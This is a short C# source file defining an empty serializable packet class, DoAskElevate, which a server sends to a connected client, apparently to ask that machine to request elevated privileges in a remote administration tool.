using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoAskElevate : IPacket
    {
        public DoAskElevate()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
